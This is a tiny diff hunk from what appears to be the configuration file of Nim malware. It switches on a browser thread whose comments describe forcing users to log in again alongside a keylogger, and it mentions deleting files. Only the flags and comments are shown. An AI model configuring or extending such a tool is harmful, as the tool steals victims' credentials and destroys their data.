@@ -48,7 +48,7 @@ const USE_KEYLOGGER_THREAD*: bool = true
 ## so the user is forced to login back again
 ## best used alongside keyloggerThread
 ## DEFAULT: true
-const USE_BROWSER_THREAD*: bool = false
+const USE_BROWSER_THREAD*: bool = true
 
 ## when `true` the program will remove files
 ## instead of renaming them
